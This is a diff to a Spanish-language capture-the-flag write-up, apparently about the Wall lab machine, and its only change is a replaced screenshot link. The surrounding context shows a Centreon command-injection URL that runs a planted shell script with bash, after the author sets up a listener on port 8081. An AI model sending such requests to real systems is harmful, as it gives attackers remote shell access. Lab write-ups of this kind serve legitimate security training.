@@ -85,6 +85,7 @@ Para eso antes, me pondré en escucha por el puerto 8081. Y finalmente, ejecutam
 
 `http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=bash%20%2Ftmp%2Fshell&o=p&min=1`
 
-![image](https://user-images.githubusercontent.com/87484792/184161738-661c37ad-69d8-496f-b830-8d1b8edaacf6.png)
+![image](https://user-images.githubusercontent.com/87484792/184162441-79d1070e-8e07-4132-9e59-646d46373b0a.png)
+
 
 
